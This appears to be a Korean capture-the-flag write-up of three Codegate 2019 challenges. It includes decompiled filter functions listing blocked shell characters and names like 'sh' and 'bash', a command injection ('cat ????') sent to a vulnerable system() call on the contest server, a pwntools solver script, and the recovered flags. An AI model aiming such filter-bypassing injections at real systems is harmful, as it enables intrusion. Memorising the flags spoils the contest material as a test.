# Codegate 2019 write up
## Introduce
* Author : Circler-K
* Date   : 2019-01-29


###  MIC check
> Let the hacking begins ~ 
>
> Decode it : 
> 9P&;gFD,5.BOPCdBl7Q+@V'1dDK?qL

- https://www.dcode.fr/ascii-85-encoding 이곳에서 체크해보면 나온다.
- 문제 설명이 플래그였다.

> flag :  Let the hacking begins ~ 



### 20000
> nc 110.10.147.106 15959
- 처음에 포너블 문제인줄 알았는데 아니였다.
```cpp
printf("INPUT : ", 0LL, &v12);
  __isoc99_scanf("%d", &v7);
  if ( v7 <= 0 && v7 > 20000 )
  {
    printf("Invalid Input");
    exit(-1);
  }
  sprintf(&s, "./20000_so/lib_%d.so", (unsigned int)v7);
  handle = dlopen(&s, 1);
  if ( handle )
  {
    v5 = handle;
    v8 = (void (__fastcall *)(void *, const char *))dlsym(handle, "test");
    if ( v8 )
    {
      v8(v5, "test");
      dlclose(handle);
      result = 0LL;
    }
```

- 20000 바이너리의 이 부분에서 숫자를 입력받고 숫자에 해당하는 libc에서 test라는 함수를 불러온다.

```cpp
// lib_9.so
handle = dlopen("./20000_so/lib_4543.so", 1);
  if ( handle )
  {
    v3 = (void (__fastcall *)(char *, char *))dlsym(handle, "filter1");
    v6 = dlopen("./20000_so/lib_1519.so", 1);
    if ( v6 )
    {
      v4 = (void (__fastcall *)(char *))dlsym(v6, "filter2");
      puts("This is lib_9 file.");
      puts("How do you find vulnerable file?");
      read(0, &buf, 0x32uLL);
      v3(&buf, &buf);
      v4(&buf);
      sprintf(&s, "ls \"%s\"", &buf);
      system(&s)
```
- lib_9.so 를 예시로 분석해보면 다른 두 libc에서 filter1과 filter2를 가져오는 것을 볼 수 있다.

```cpp
// lib_4543.so
char *__fastcall filter1(const char *a1)
{
  char *result; // rax

  if ( strchr(a1, ';') )
    exit(0);
  if ( strchr(a1, '*') )
    exit(0);
  if ( strchr(a1, '|') )
    exit(0);
  if ( strchr(a1, '&') )
    exit(0);
  if ( strchr(a1, '$') )
    exit(0);
  if ( strchr(a1, '`') )
    exit(0);
  if ( strchr(a1, '>') )
    exit(0);
  if ( strchr(a1, '<') )
    exit(0);
  result = strchr(a1, 'r');
  if ( result )
    exit(0);
  return result;
}
```
```cpp
// lib_1519.so
char *__fastcall filter2(const char *a1)
{
  char *result; // rax

  if ( strchr(a1, 'v') )
    exit(0);
  if ( strchr(a1, 'm') )
    exit(0);
  if ( strchr(a1, 'p') )
    exit(0);
  if ( strchr(a1, 'd') )
    exit(0);
  if ( strchr(a1, 'n') )
    exit(0);
  if ( strstr(a1, "bin") )
    exit(0);
  if ( strstr(a1, "sh") )
    exit(0);
  if ( strstr(a1, "bash") )
    exit(0);
  if ( strchr(a1, 'f') )
    exit(0);
  if ( strchr(a1, 'l') )
    exit(0);
  result = strchr(a1, 'g');
  if ( result )
    exit(0);
  return result;
}
```
- 온갖 리다이렉션들이 막혀있는 것들을 보아 커맨드인젝션을 할 수 있을거 같지가 않았다.
- ls -ltr 을 사용하면 수정일자대로 정렬을 해주는데 수정일자가 다른 하나의 파일이 있었다.

```cpp
-rwxr-xr-x 1 root    root      6224 Jan 25 22:33 lib_9964.so
-rwxr-xr-x 1 root    root      6224 Jan 25 22:33 lib_9980.so
-rwxr-xr-x 1 root    root      6224 Jan 25 22:33 lib_9982.so
-rwxr-xr-x 1 root    root      6224 Jan 25 22:33 lib_9984.so
-rwxr-xr-x 1 root    root      6224 Jan 25 22:33 lib_9988.so
-rwxr-xr-x 1 root    root      6224 Jan 25 22:33 lib_9992.so
-rwxr-xr-x 1 root    root      6224 Jan 25 22:33 lib_9994.so
-rwxr-xr-x 1 root    root      6224 Jan 25 22:33 lib_9.so
-rwxr-xr-x 1 root    root      6224 Jan 26 10:37 lib_17394.so
```

```cpp
handle = dlopen("./20000_so/lib_4323.so", 1);
  if ( handle )
  {
    v3 = (void (__fastcall *)(char *, char *))dlsym(handle, "filter1");
    v6 = dlopen("./20000_so/lib_11804.so", 1);
    if ( v6 )
    {
      v4 = (void (__fastcall *)(char *))dlsym(v6, "filter2");
      puts("This is lib_17394 file.");
      puts("How do you find vulnerable file?");
      read(0, &buf, 0x32uLL);
      v3(&buf, &buf);
      v4(&buf);
      sprintf(&s, "%s 2 > /dev/null", &buf);
      system(&s);
```
- lib_17394.so 파일을 분석해보면 sprintf 함수에서 %s 앞에 ls 가 없는 것을 발견할 수있다.
- 처음에는 아무 숫자나 입력하고 \"-a 를 입력하면 flag가 있는 것을 확인하였다.
```cpp
circler@ubuntu:~/Desktop/codegate/asdf$ nc 110.10.147.106 15959 

   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  
  /$$__  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ 
 |__/  \ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$ 
   /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$ 
  /$$____/ | $$\ $$$$| $$\ $$$$| $$\ $$$$| $$\ $$$$ 
 | $$      | $$ \ $$$| $$ \ $$$| $$ \ $$$| $$ \ $$$ 
 | $$$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/ 
 |________/ \______/  \______/  \______/  \______/  

INPUT : 17394
This is lib_17394 file.
How do you find vulnerable file?
cat ????
flag{Are_y0u_A_h@cker_in_real-word?}

```
- 그 후 ? 를 사용하여 flag를 읽을 수 있다.

> flag : Are_y0u_A_h@cker_in_real-word?



### algo_auth
> I like an algorithm 

- 코드는 dp이지만 사실 하나당 시간제한이 10초라 7*7 dfs 돌려도 풀리긴 풀린다.
- 돌리면 플래그는 주지 않는다.
- 좀 생각을 해보니 각 스테이지의 값들이 ascii 범위라는걸 찾았고 값들을 출력시켜보았다.
- 출력된 값들을 이리저리 돌려보다가 base64로 인코딩된 문자열인걸 찾고 코드를 다시 작성했다.

#### last.py
```python
from pwn import *
import base64
import re
r = remote("110.10.147.104",15712)
all_list = []
def get_matrix():
    r.recvuntil("***\n")
    result = []
    result.append(map(int,re.findall(r'\b\d+\b',r.recvline())))
    result.append(map(int,re.findall(r'\b\d+\b',r.recvline())))
    result.append(map(int,re.findall(r'\b\d+\b',r.recvline())))
    result.append(map(int,re.findall(r'\b\d+\b',r.recvline())))
    result.append(map(int,re.findall(r'\b\d+\b',r.recvline())))
    result.append(map(int,re.findall(r'\b\d+\b',r.recvline())))
    result.append(map(int,re.findall(r'\b\d+\b',r.recvline())))
    return result

def main():    
    matrix = get_matrix()
    size = len(matrix)
    best = [matrix[row][0] for row in range(size)]
    for col in range(1, size):
        column = [matrix[row][col] for row in range(size)]
        tmp = column[:]

        for i in range(size):
            column[i] += best[i] # right

            for j in range(0, i): # up
                if sum([best[j]]+tmp[j:i+1]) < column[i]:
                    column[i] = sum([best[j]]+tmp[j:i+1])

            for k in range(i, size): # bottom
                if sum([best[k]] +tmp[i:k+1]) < column[i]:
                    column[i] = sum([best[k]] +tmp[i:k+1])

        best = column
        temp = min(best)
    
    result =  chr(temp)
    all_list.append(temp)
    r.recvuntil(">>>")
    r.sendline(str(temp))
    return result


if __name__ == "__main__":
    r.recvuntil(">>")
    r.sendline("g")
    encoded = ""
    for i in range(100):
        answer = main()
        print "{} : {}".format(i+1,ord(answer))
        encoded += answer

    print all_list
    print encoded
    print base64.b64decode(encoded)

    r.interactive()
```

- 돌리면 플래그는 주지 않는다.
- 좀 생각을 해보니 각 스테이지의 값들이 ascii 범위라는걸 찾았고 값들을 출력시켜보았다.

```cpp
1 : 82
2 : 107
3 : 120
4 : 66
5 : 82
6 : 121
7 : 65
.
.
.
.
.
94 : 83
95 : 69
96 : 104
97 : 73
98 : 83
99 : 69
100 : 104
[82, 107, 120, 66, 82, 121, 65, 54, 73, 71, 99, 119, 77, 71, 57, 118, 84, 48, 57, 107, 88, 50, 111, 119, 81, 105, 69, 104, 73, 86, 57, 102, 88, 51, 86, 117, 89, 50, 57, 116, 90, 109, 57, 121, 100, 68, 82, 105, 98, 71, 86, 102, 88, 51, 77, 122, 89, 51, 86, 121, 97, 88, 82, 53, 88, 49, 57, 112, 99, 49, 57, 102, 98, 106, 66, 48, 88, 49, 56, 48, 88, 49, 57, 122, 90, 87, 78, 49, 99, 109, 108, 48, 101, 83, 69, 104, 73, 83, 69, 104]
RkxBRyA6IGcwMG9vT09kX2owQiEhIV9fX3VuY29tZm9ydDRibGVfX3MzY3VyaXR5X19pc19fbjB0X180X19zZWN1cml0eSEhISEh
FLAG : g00ooOOd_j0B!!!___uncomfort4ble__s3curity__is__n0t__4__security!!!!!
```

> FLAG : g00ooOOd_j0B!!!___uncomfort4ble__s3curity__is__n0t__4__security!!!!!
